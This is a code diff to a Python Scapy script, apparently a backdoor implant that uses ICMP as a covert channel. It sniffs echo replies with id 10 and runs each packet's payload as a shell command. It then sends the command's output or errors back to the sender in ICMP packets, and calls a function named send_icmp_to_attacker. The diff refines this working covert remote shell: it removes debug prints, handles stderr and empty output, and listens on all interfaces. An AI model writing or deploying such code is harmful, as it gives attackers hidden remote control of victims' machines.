@@ -15,32 +15,38 @@ def send_icmp_to_attacker():
 def check_packet(packet):
     try:
         if packet.haslayer(ICMP) and packet[ICMP].type == 0:
-            if packet[ICMP].id == 10:
-                # packet.show()
-                # print(packet[Raw].load)
-                if packet[Raw].load:
-                    if packet[Ether].src != get_if_hwaddr("eth0"):
-                        print("incoming packet")
-                        packet.show()
-                        result = subprocess.run(
-                            packet[Raw].load, shell=True, capture_output=True, text=True
-                        )
-                        # print(result.stdout)
-                        print("outgoing packet")
+            if packet[ICMP].id == 10 and packet[Raw].load:
+                if packet[Ether].src != get_if_hwaddr("eth0"):
+                    result = subprocess.run(
+                        packet[Raw].load, shell=True, capture_output=True, text=True
+                    )
+                    if result.stdout:
                         reply_packet = (
                             IP(dst=packet[IP].src)
                             / ICMP(id=10, type=0)
                             / Raw(load=result.stdout)
                         )
-                        reply_packet.show()
                         send(reply_packet)
+                    elif result.stderr:
+                        reply_packet = (
+                            IP(dst=packet[IP].src)
+                            / ICMP(id=10, type=0)
+                            / Raw(load=result.stderr)
+                        )
+                        send(reply_packet)
+                    else:
+                        reply_packet = (
+                            IP(dst=packet[IP].src) / ICMP(id=10, type=0) / Raw()
+                        )
+                        send(reply_packet)
+
     except Exception as e:
         pass
 
 
 def main():
     send_icmp_to_attacker()
-    sniff(prn=check_packet, iface="eth0")
+    sniff(prn=check_packet)
 
 
 if __name__ == "__main__":
